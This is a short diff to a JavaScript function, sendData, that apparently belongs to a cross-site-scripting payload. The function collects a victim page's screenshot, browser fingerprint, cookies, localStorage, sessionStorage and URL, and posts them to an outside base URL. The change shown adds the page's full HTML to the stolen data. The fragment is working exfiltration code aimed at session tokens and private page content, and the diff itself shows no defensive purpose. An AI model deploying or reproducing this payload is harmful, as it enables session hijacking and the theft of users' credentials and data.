@@ -8511,8 +8511,9 @@ async function sendData(baseURL, otherData) {
     localStorageEncoded = encodeURIComponent(JSON.stringify(localStorage))
     sessionStorageEncoded = encodeURIComponent(JSON.stringify(sessionStorage))
     callerURL = encodeURIComponent(location.href)
+    dom = encodeURIComponent(document.documentElement.innerHTML)
 
-    postData = `screenshot=${screenshot}&fingerprint=${fingerprint}&cookies=${cookies}&local_storage=${localStorageEncoded}&session_storage=${sessionStorageEncoded}&origin_url=${callerURL}&${otherData}`
+    postData = `dom=${dom}&screenshot=${screenshot}&fingerprint=${fingerprint}&cookies=${cookies}&local_storage=${localStorageEncoded}&session_storage=${sessionStorageEncoded}&origin_url=${callerURL}&${otherData}`
 
     request = new XMLHttpRequest()
 
